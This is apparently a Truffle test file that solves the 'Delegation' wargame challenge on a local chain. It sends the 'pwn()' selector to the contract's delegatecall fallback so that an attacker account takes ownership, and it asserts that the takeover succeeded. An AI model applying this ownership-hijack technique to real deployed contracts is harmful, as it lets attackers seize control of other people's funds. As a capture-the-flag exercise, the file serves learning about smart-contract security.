const Delegation = artifacts.require("Delegation");
const Delegate = artifacts.require("Delegate");
const Web3 = require("web3");
const chai = require("chai");
contract("Delegation", (accounts) => {
  const [owner, hack] = accounts;
  let delegationContract, delegateContract;
  beforeEach(async () => {
    delegateContrat = await Delegate.new(owner, { from: owner });
    delegationContract = await Delegation.new(delegateContrat.address, {
      from: owner,
    });
    // delegateContract = await Delegation.delegate();
  });

  it("hack should get control over delegate contract", async () => {
    const previousOwner = await delegationContract.owner();
    expect(previousOwner).to.be.equal(owner);
    // console.log("owner", owner);
    // console.log("hack", hack);
    // console.log("delegateContrat", delegateContrat.address);
    // console.log("delegationContract", delegationContract.address);
    // console.log("previousOwner", previousOwner);
    const web3 = new Web3("http://localhost:8545");
    const selector = web3.eth.abi.encodeFunctionSignature("pwn()");
    await delegationContract.sendTransaction({ from: hack, data: selector });
    const newOwner = await delegationContract.owner();
    expect(newOwner).to.be.equal(hack);
  });
});
